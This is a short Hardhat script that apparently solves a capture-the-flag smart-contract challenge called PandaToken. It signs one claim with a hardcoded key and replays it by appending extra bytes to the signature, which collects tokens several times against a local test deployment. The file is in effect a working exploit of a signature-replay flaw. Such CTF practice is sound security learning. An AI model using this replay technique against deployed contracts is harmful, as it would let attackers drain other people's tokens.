import chalk from "chalk";
import { ethers } from "hardhat";
import { PandaTokenQuill__factory, PandaTokenQuill } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [pandaQuillContract, attacker] = await initialize<PandaTokenQuill>(PandaTokenQuill__factory, undefined, [400, "PandaToken", "PND"]);
    let coder = ethers.AbiCoder.defaultAbiCoder();
    let data = coder.encode(["address", "uint"], [attacker.address, ethers.parseEther("1")]);
    let hash = ethers.keccak256(data);
    let signKey = new ethers.SigningKey("0x4ff809b8571d1b843eca34c0fdeb9c74d09707a224732e8d911dc8556354ca17");
    let sig = signKey.sign(hash);
    
    // for(let i = 0; i < 100; i++) {
    //     log(`Amount: ${await pandaQuillContract.calculateAmount(i)}`);
    // }
    let ownerBalance = await pandaQuillContract.balanceOf(await pandaQuillContract.owner());
    log(`Owner's balance: ${ethers.formatEther(ownerBalance)}`);
    let tx = await pandaQuillContract.getTokens(ethers.parseEther("1"), sig.serialized);
    await tx.wait();
    tx = await pandaQuillContract.getTokens(ethers.parseEther("1"), sig.serialized+"12");
    await tx.wait();
    tx = await pandaQuillContract.getTokens(ethers.parseEther("1"), sig.serialized+"34");
    await tx.wait();

    log(`Attacker balance: ${ethers.formatEther(await pandaQuillContract.balanceOf(attacker.address))}`);
    log(`Is solved: ${chalk.yellow(await pandaQuillContract.isSolved())}`); 
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});